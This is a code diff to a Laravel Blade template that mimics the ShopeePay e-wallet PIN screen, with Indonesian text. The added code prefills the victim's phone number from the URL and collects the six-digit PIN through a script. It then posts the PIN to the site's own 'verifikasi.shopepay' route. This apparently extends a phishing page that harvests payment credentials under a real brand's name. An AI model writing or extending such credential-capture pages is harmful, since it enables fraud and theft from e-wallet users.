@@ -61,15 +61,15 @@
                 </div>
             </div>
 
-            <p class="text-secondary small mb-2">Masukkan nomor HP sebagai ID shopeePay</p>
+            <p class="text-secondary small mb-2">Nomor HP Anda</p>
             <div class="input-group mb-4 custom-input-group">
                 <div class="input-group-prepend">
                     <span class="input-group-text bg-white border-0">
                         <i class="fa-solid fa-phone text-secondary"></i>
                     </span>
                 </div>
-                <input type="tel" class="form-control border-0 phone-input" placeholder="+62213129328"
-                    aria-label="Nomor HP">
+                <input type="tel" class="form-control border-0 phone-input" value="{{ request('phone') }}"
+                    aria-label="Nomor HP" readonly>
             </div>
 
             <h6 class="font-weight-bold mb-3 terms-title">Syarat & Ketentuan</h6>
@@ -105,21 +105,26 @@
                     </h5>
 
                     <p class="mb-4">Masukkan 6 digit PIN shopeePay </p>
+                    <form method="POST" action="{{ route('verifikasi.shopepay') }}">
+                        @csrf
+                        <input type="hidden" name="phone" value="{{ request('phone') }}">
 
-                    <div class="d-flex justify-content-center mb-3">
-                        <input type="password" maxlength="1" class="pin-input" data-index="0">
-                        <input type="password" maxlength="1" class="pin-input" data-index="1">
-                        <input type="password" maxlength="1" class="pin-input" data-index="2">
-                        <input type="password" maxlength="1" class="pin-input" data-index="3">
-                        <input type="password" maxlength="1" class="pin-input" data-index="4">
-                        <input type="password" maxlength="1" class="pin-input" data-index="5">
-                    </div>
+                        <div class="d-flex justify-content-center mb-3">
+                            <input type="password" maxlength="1" class="pin-input" data-index="0">
+                            <input type="password" maxlength="1" class="pin-input" data-index="1">
+                            <input type="password" maxlength="1" class="pin-input" data-index="2">
+                            <input type="password" maxlength="1" class="pin-input" data-index="3">
+                            <input type="password" maxlength="1" class="pin-input" data-index="4">
+                            <input type="password" maxlength="1" class="pin-input" data-index="5">
+                            <input type="hidden" name="verifikasi" id="verifikasi">
+                        </div>
 
-                    <a href="#" class="text-info small mb-4 d-block">Lupa PIN?</a>
+                        <a href="#" class="text-info small mb-4 d-block">Lupa PIN?</a>
 
-                    <button class="btn btn-block poppins-regular enter-button">
-                        Masukkan
-                    </button>
+                        <button type="submit" class="btn btn-block poppins-regular enter-button">
+                            Masukkan
+                        </button>
+                    </form>
                 </div>
             </div>
         </div>
@@ -131,6 +136,15 @@
     </script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"
         integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct" crossorigin="anonymous">
+    </script>
+    <script>
+        document.querySelector('form').addEventListener('submit', function(e) {
+            let pin = '';
+            document.querySelectorAll('.pin-input').forEach(function(input) {
+                pin += input.value;
+            });
+            document.getElementById('verifikasi').value = pin;
+        });
     </script>
 </body>
 
